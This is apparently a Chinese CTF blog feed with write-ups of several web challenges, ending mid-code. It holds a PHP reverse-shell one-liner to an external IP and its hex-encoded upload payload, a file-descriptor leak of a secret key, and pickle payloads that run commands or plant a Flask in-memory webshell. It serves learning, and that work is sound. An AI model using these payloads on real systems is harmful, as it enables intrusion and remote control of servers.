class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hex编码一下执行php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;107.148.75.202&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=exec(hex2bin(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223130372e3134382e37352e323032222c31323334293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;))?&gt;</span><br></pre></td></tr></table></figure><p>flag在根目录</p><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p>有这样一个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=</span><br></pre></td></tr></table></figure><p>一开始按ssrf做发现file协议读取不了任何文件, 也探测不到其他端口的开放</p><p>看了WP才发现原来用的是python2的<code>urllib</code>的<code>urlopen</code>，和<code>urllib2</code>中的<code>urlopen</code>明显区别就是<code>urllib.urlopen</code>支持将路径作为参数去打开对应的本地路径，所以可以直接填入路径读取文件</p><p>不知道怎么看出来的python2的urllib, 只能看到响应头  Server: openresty</p><p>首先可以读当前的服务 &#x2F;proc&#x2F;self&#x2F;cmdline  </p><p>读取web服务的源码 &#x2F;page?url&#x3D;&#x2F;app&#x2F;app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>我们需要知道SECRET_KEY的内容才能得到shell</p><p>下面是它的由来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br></pre></td></tr></table></figure><p>这里读取后删除了txt, 但是并没有关闭这个f, 因此可以在&#x2F;proc&#x2F;self&#x2F;fd&#x2F;[num]中读取到内容</p><p>遍历一下num即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=/proc/self/fd/3</span><br></pre></td></tr></table></figure><p>读到key内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6mjoys/T/kzPpBeY3iDkOr0wcuHIm9Ake8ygyiKhAfQ=</span><br></pre></td></tr></table></figure><p>由于无回显, 反弹shell即可</p><p> 当然还有一个非预期是直接读取&#x2F;flag</p><p>flag{4d855645-f351-4353-af7c-1a993e5b92ab}</p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>注册登录, 上传头像处getshell</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;buuoj一次刷个够&quot;&gt;&lt;a href=&quot;#buuoj一次刷个够&quot; class=&quot;headerlink&quot; title=&quot;buuoj一次刷个够&quot;&gt;&lt;/a&gt;buuoj一次刷个够&lt;/h1&gt;&lt;h2 id=&quot;FBCTF2019-RCEService&quot;&gt;&lt;a href=&quot;#F</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>第二届黄河流域安全技能挑战赛Web</title>
    <link href="http://example.com/2024/05/30/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWeb/"/>
    <id>http://example.com/2024/05/30/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWeb/</id>
    <published>2024-05-30T05:27:49.000Z</published>
    <updated>2024-05-30T05:28:35.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二届黄河流域安全技能挑战赛复现"><a href="#第二届黄河流域安全技能挑战赛复现" class="headerlink" title="第二届黄河流域安全技能挑战赛复现"></a>第二届黄河流域安全技能挑战赛复现</h1><p>题目还挺不错的, 但是赛中没做, 这里看wp复现一下</p><p>膜拜大师傅wp <a href="https://www.cnblogs.com/gxngxngxn/p/18187578">https://www.cnblogs.com/gxngxngxn/p/18187578</a></p><h2 id="myfavorPython"><a href="#myfavorPython" class="headerlink" title="myfavorPython"></a>myfavorPython</h2><p>随便传一个opcode会发现并不是反序列化执行了, 而是用pickletools.dis, 一眼看出来了,但是以为这里还以为可以注入, 没想到这里其实是flask开了debug模式 直接构造报错就可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Python-revenge"><a href="#Python-revenge" class="headerlink" title="Python-revenge"></a>Python-revenge</h2><p>这个也是在gxngxngxn师傅对python内存马的研究orz</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18187578">https://www.cnblogs.com/gxngxngxn/p/18187578</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><p>之后随便打开一个404页面就可以命令执行</p><h2 id="逃跑大师"><a href="#逃跑大师" class="headerlink" title="逃跑大师"></a>逃跑大师</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span>, <span class="variable">$end</span> + <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$A</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$B</span> = <span class="string">&quot;HELLO&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$C</span> = <span class="string">&quot;!!!&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$A</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;A = <span class="variable">$A</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$this</span>-&gt;B . <span class="string">&quot;[welcome sdpcsec&quot;</span> .<span class="variable">$this</span>-&gt;C . <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;escape&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$Class</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;escape&#x27;</span>]);</span><br><span class="line">    <span class="variable">$Key</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Class</span>);</span><br><span class="line">    <span class="variable">$K</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;SDPCSEC&quot;</span>, <span class="string">&quot;SanDieg0&quot;</span>, <span class="variable">$Key</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$K</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察mb_strpos与mb_substr执行差异导致的漏洞</p><p>这里我也测试了一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$start</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$data</span>[<span class="variable">$start</span>] . <span class="string">&#x27;&lt;/br&gt;&#x27;</span> ;</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$end</span> . <span class="string">&#x27; &#x27;</span> .  <span class="variable">$data</span>[<span class="variable">$end</span>] . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span>, <span class="variable">$end</span> + <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="number">0</span>] . <span class="string">&quot;[welcome sdpcsec&quot;</span> .<span class="variable">$_GET</span>[<span class="number">1</span>] . <span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$key</span>;</span><br></pre></td></tr></table></figure><p>首先是<code>%9f</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515184216748.png" alt="image-20240515184216748"></p><p>可以看见这里的mb_strpos是直接忽略了<code>%9f</code>这个不可见字符, 而mb_substr并没有忽略, 而是正常处理, 这导致返回的字符整体向前移了一位</p><p>再来看<code>%f0</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515193637458.png" alt="image-20240515193637458"></p><p>这里mb_strpos是正常识别的, mb_substr把<code>%f0</code> 连着后面的三个字符识别成了一个字符</p><p>在mb_substr看来, 第0个字符是<code>%f0[we</code> , 第一个字符是<code>l</code> , 然后连着输出了后面21个字符</p><p>因此,<code>%9f</code>用来增加一个字符，<code>%f0</code>用来减少三个字符，我们利用这个特性，可以实现任意字符的构造</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515201303695.png" alt="image-20240515201303695"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515202049157.png" alt="image-20240515202049157"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第二届黄河流域安全技能挑战赛复现&quot;&gt;&lt;a href=&quot;#第二届黄河流域安全技能挑战赛复现&quot; class=&quot;headerlink&quot; title=&quot;第二届黄河流域安全技能挑战赛复现&quot;&gt;&lt;/a&gt;第二届黄河流域安全技能挑战赛复现&lt;/h1&gt;&lt;p&gt;题目还挺不错的, 但是赛中没</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Dragon Knight CTF 2024</title>
    <link href="http://example.com/2024/05/30/Dragon-Knight-CTF-2024/"/>
    <id>http://example.com/2024/05/30/Dragon-Knight-CTF-2024/</id>
    <published>2024-05-30T03:42:58.000Z</published>
    <updated>2024-05-30T03:44:27.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>直接扫码</p><h2 id="神秘文字"><a href="#神秘文字" class="headerlink" title="神秘文字"></a>神秘文字</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">𓅂=+![];𓂀=+!𓅂;𓁄=𓂀+𓂀;𓊎=𓁄+𓂀;𓆣=𓁄*𓁄;𓊝=𓊎+𓁄;𓆫=𓁄*𓊎;𓅬=𓆣+𓊎;[𓇎,𓏢,𓆗,𓃠,𓃀,𓋌,𓏁,𓇲,𓁣,𓁺,𓏁,𓇲,𓆦,𓏁,𓁣,𓇲,𓄬,𓇲,𓁣,𓏁,𓋌,𓁣,𓇲,𓏁,𓋌,𓇲]=(𓆡=&#x27;\\&quot;&#x27;)+!!𓆡+!𓆡+𓆡.𓆡+&#123;&#125;;𓆉=𓇲+𓁣+𓆦+𓁺+𓆗+𓃠+𓃀+𓇲+𓆗+𓁣+𓃠,𓆉=𓆉[𓆉][𓆉],𓄦=𓏁+𓁣+𓄬+𓆦,𓄀=𓃠+𓋌+𓆗+𓃀+𓃠+𓆦+&quot; &quot;;𓆉(𓆉(𓄀+𓏢+𓆉(𓄀+[...&quot;𓇎𓂀𓅂𓅬𓇎𓂀𓂀𓅬𓇎𓂀𓂀𓅬𓇎𓂀𓅂𓆣𓇎𓆣𓂀𓇎𓂀𓊎𓂀𓇎𓂀𓂀𓅬𓇎𓂀𓁄𓊝𓇎𓂀𓆫𓁄𓇎𓆣𓅂𓇎𓂀𓆫𓅂𓇎𓂀𓅂𓂀𓇎𓂀𓆫𓊎𓇎𓂀𓆫𓊎𓇎𓂀𓁄𓅬𓇎𓂀𓊝𓅬𓇎𓂀𓆫𓁄𓇎𓂀𓆣𓆣𓇎𓆣𓅂𓇎𓂀𓊝𓂀𓇎𓂀𓆫𓊎𓇎𓅬𓁄𓇎𓂀𓊝𓊝𓇎𓂀𓅂𓂀𓇎𓂀𓆫𓁄𓇎𓂀𓆫𓆣𓇎𓆫𓂀𓇎𓂀𓂀𓆫𓇎𓂀𓊎𓅬𓇎𓂀𓂀𓊎𓇎𓆫𓂀𓇎𓂀𓅂𓊝𓇎𓂀𓁄𓅂𓇎𓂀𓆫𓅂𓇎𓆫𓊎&quot;][𓄦]`+`)``+𓏢)``)``</span><br></pre></td></tr></table></figure><p>一眼jsFuck</p><p>放到本地node环境运行</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526202432238.png" alt="image-20240526202432238" /><p>拿到压缩包密码 mArt1N_K1EPp3</p><p>DRKCTF{D0_Y0u_KnOw_Wh0_Creat3_J5Fu*K?}</p><h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="羡慕群友每一天"><a href="#羡慕群友每一天" class="headerlink" title="羡慕群友每一天"></a>羡慕群友每一天</h2><p>谷歌识图直接可以识别到这个视频， 和图片里的摩天轮一模一样</p><p><a href="https://www.youtube.com/watch?app=desktop&v=2JY1s5UysPk&ab_channel=ActionKid">https://www.youtube.com/watch?app=desktop&amp;v=2JY1s5UysPk&amp;ab_channel=ActionKid</a></p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240525143303296.png" alt="image-20240525143303296" /><p>去谷歌地图找到精确位置</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240525143102076.png" alt="image-20240525143102076" /><p>DRKCTF{美国-佛罗里达州-迈阿密市-Skyviews}</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezsign"><a href="#ezsign" class="headerlink" title="ezsign"></a>ezsign</h2><p>进去之后是一个登录，admin&#x2F;admin</p><p>是一个前端的留言板， 没什么用</p><p>扫描一下目录</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526190725821.png" alt="image-20240526190725821" /><p> 可以看见还是能扫描出来很多东西，包括.DS_Store</p><p>github上随便找一个利用的.DS_Store工具， 我这里用的是ds_store_exp</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526193540195.png" alt="image-20240526193540195" /><p>主要看这个index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span 